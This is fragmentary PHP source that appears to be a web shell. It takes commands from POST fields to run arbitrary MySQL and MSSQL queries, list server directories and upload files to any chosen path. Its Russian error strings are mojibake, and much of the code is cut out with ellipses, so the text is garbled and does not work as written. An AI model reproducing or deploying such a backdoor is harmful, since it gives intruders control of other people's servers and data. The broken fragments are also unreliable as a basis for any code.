...
if ($_POST['cmd'] == "db_query")
{
    ...
    switch ($_POST['db'])
    {
        case 'MySQL':
            ...
            if ($db)
            {
                ...
                {
                    @mysql_select_db($_POST['mysql_db'], $db);
                }
                ...
                foreach ($querys as $num => $query)
                {
                    if (strlen($query) > 5)
                    {
                        ...
                        if ($error)
                        {
                            echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>" . $error . "</b></font></td></tr></table><br>";
                        }
                        else
                        {
                            ...
                            {
                                if (($rows = @mysql_affected_rows($db)) >= 0)
                                {
        ...
        case 'MSSQL':
            ...
            if ($db)
            {
                if (!empty($_POST['mysql_db']))
                {
                    @mssql_select_db($_POST['mysql_db'], $db);
                }
                $querys = @explode(';', $_POST['db_query']);
                foreach ($querys as $num => $query)
                {
    ...
    */
    ...
    $windows = 0;
    $unix = 0;
    if (strlen($dir) > 1 && $dir[1] == ":") $windows = 1;
    else $unix = 1;
    if (empty($dir))
    {
        $os = getenv('OS');
    ...
    function we($i)
    {
        ...
        {
            $text = 'ÐžÑˆÐ¸Ð±ÐºÐ°! ÐÐµ Ð¼Ð¾Ð³Ñƒ Ð·Ð°Ð¿Ð¸ÑÐ°Ñ‚ÑŒ Ð² Ñ„Ð°Ð¹Ð» ';
        }
        else
        {
    ...
    function re($i)
    {
        if ($GLOBALS['language'] == "ru")
        {
            $text = 'ÐžÑˆÐ¸Ð±ÐºÐ°! ÐÐµ Ð¼Ð¾Ð³Ñƒ Ð¿Ñ€Ð¾Ñ‡Ð¸Ñ‚Ð°Ñ‚ÑŒ Ñ„Ð°Ð¹Ð» ';
        }
        else
        {
    ...
    function ce($i)
    {
        if ($GLOBALS['language'] == "ru")
        {
            $text = "ÐÐµ ÑƒÐ´Ð°Ð»Ð¾ÑÑŒ ÑÐ¾Ð·Ð´Ð°Ñ‚ÑŒ ";
        }
        else
        {
            $text = "Can't create ";
        ...
        if (($handle = @opendir($dir)))
        {
            while (false !== ($file = @readdir($handle)))
            {
                if ($file != "." && $file != "..")
                {
                    ...
                    else $files[$file] = @filesize($dir . "/" . $file);
                }
            }
            @closedir($handle);
            @ksort($dirs);
...
<tr><td align=right width=100>';
    ...
    if (!empty($_POST['cmd']) && $_POST['cmd'] == "mk")
    {
        ...
        if (!empty($HTTP_POST_FILES['userfile']['name']))
        {
            ...
            @copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['dir'] . "/" . $nfn) or print ("<font color=red face=Fixedsys><div align=center>Error uploading file " . $HTTP_POST_FILES['userfile']['name'] . "</div></font>");
        }
